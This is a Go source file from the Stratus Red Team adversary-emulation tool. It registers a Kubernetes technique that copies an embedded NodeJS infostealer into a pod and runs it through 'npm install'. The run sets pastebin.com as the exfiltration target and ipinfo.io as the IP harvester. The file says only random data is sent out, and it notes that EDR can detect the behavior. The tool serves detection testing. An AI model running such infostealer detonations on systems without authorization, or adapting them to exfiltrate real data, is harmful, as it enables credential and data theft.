package kubernetes

import (
	"context"
	"embed"
	"fmt"
	"io/fs"
	"log"
	"time"

	"github.com/datadog/stratus-red-team/v2/internal/utils/kubernetes"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
)

//go:embed main.tf
var tf []byte

//go:embed infostealer/*
var infostealerFS embed.FS

const techniqueID = "k8s.exfiltration.infostealer"

// infostealerDestPath is where the infostealer files are copied in the pod.
const infostealerDestPath = "/tmp/stratus-red-team-infostealer"

// For now, only have NodeJS
type Infostealer string

const (
	NodeJS Infostealer = "nodejs"
)

type InfoStealerDetonation struct {
	language       string
	command        string
	containerImage string
}

var infostealerDetonations = map[Infostealer]InfoStealerDetonation{
	NodeJS: {
		language:       "NodeJS",
		command:        "npm install",
		containerImage: "node:20-alpine",
	},
}

type ExfilWebsite string

// For now, only have Pastebin
const (
	Pastebin ExfilWebsite = "pastebin"
)

var exfilWebsites = map[ExfilWebsite]string{
	Pastebin: "https://pastebin.com",
}

type IPHarvester string

const (
	IPInfo     IPHarvester = "ipinfo"
	IfconfigMe IPHarvester = "ifconfig.me"
)

var ipHarvesters = map[IPHarvester]string{
	IPInfo:     "https://ipinfo.io/ip",
	IfconfigMe: "https://ifconfig.me/ip",
}

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:                 techniqueID,
		FriendlyName:       "Run an Infostealer in a Pod and try to exfiltrate to a remote server",
		Platform:           stratus.Kubernetes,
		IsIdempotent:       false,
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.Collection, mitreattack.Exfiltration},
		Description: `
Run a pod, collect some information often collected by infostealers, and try to exfiltrate a file with random data to a remote server.
We do not try to exfiltrate the collected data to avoid any real leakage.
This attack uses a script in ` + infostealerDetonations[NodeJS].language + `, requiring a container image with the appropriate runtime.

Warm-up:

- Create the Stratus Red Team namespace
- Create a Service Account
- Create a Pod running under this service account

Detonation:

- Execute <code>` + infostealerDetonations[NodeJS].command + `</code> into the pod
`,
		Detection: `
An EDR running on the host node where the pod is deployed will see the running processes and can alert on suspicious behavior.
`,
		PrerequisitesTerraformCode: tf,
		PodConfigViaTerraform:      true,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	// TODO: add parameters to choose the infostealer, exfil website, and IP harvester
	return detonateWithInfostealer(params, providers, NodeJS, Pastebin, IPInfo)
}

func detonateWithInfostealer(params map[string]string, providers stratus.CloudProviders, infostealer Infostealer, exfilWebsite ExfilWebsite, ipHarvester IPHarvester) error {
	config := providers.K8s().GetRestConfig()
	client := providers.K8s().GetClient()
	namespace := params["namespace"]
	podName := params["pod_name"]

	detonation, ok := infostealerDetonations[infostealer]
	if !ok {
		return fmt.Errorf("unknown infostealer: %s", infostealer)
	}

	exfilURL, ok := exfilWebsites[exfilWebsite]
	if !ok {
		return fmt.Errorf("unknown exfil website: %s", exfilWebsite)
	}

	ipHarvesterURL, ok := ipHarvesters[ipHarvester]
	if !ok {
		return fmt.Errorf("unknown IP harvester: %s", ipHarvester)
	}

	log.Println("Copying " + detonation.language + " infostealer to pod " + podName + " in namespace " + namespace)

	// Get the subdirectory for the selected infostealer language
	subFS, err := fs.Sub(infostealerFS, "infostealer/"+string(infostealer))
	if err != nil {
		return err
	}

	copyCtx, copyCancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer copyCancel()

	err = kubernetes.CopyFSToPod(
		copyCtx,
		config,
		client,
		namespace, podName, "",
		subFS,
		infostealerDestPath,
	)
	if err != nil {
		return fmt.Errorf("failed to copy infostealer files: %w", err)
	}

	log.Println("Successfully copied infostealer files to pod")

	// Execute the infostealer with environment variables
	log.Println("Running infostealer with exfil target: " + exfilURL)
	log.Println("Using IP harvester: " + ipHarvesterURL)

	// Longer timeout for execution (npm install can take time)
	execCtx, execCancel := context.WithTimeout(context.Background(), 2*time.Minute)
	defer execCancel()

	shellCmd := fmt.Sprintf("cd %s && EXFIL_URL=%s IP_HARVESTER_URL=%s %s",
		infostealerDestPath, exfilURL, ipHarvesterURL, detonation.command)
	stdout, stderr, err := kubernetes.ExecInPod(
		execCtx,
		config,
		client,
		namespace, podName, "",
		[]string{"sh", "-c", shellCmd},
	)
	if err != nil {
		return fmt.Errorf("failed to execute infostealer: %w (stderr: %s)", err, stderr)
	}

	if stdout != "" {
		log.Println("Infostealer output:\n" + stdout)
	}

	log.Println("Successfully executed infostealer")
	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	config := providers.K8s().GetRestConfig()
	client := providers.K8s().GetClient()
	namespace := params["namespace"]
	podName := params["pod_name"]

	log.Println("Removing infostealer files from pod " + podName + " in namespace " + namespace)

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	_, stderr, err := kubernetes.ExecInPod(
		ctx,
		config,
		client,
		namespace, podName, "",
		[]string{"rm", "-rf", infostealerDestPath},
	)
	if err != nil {
		return fmt.Errorf("failed to remove infostealer files: %w (stderr: %s)", err, stderr)
	}

	log.Println("Successfully removed infostealer files from pod")
	return nil
}
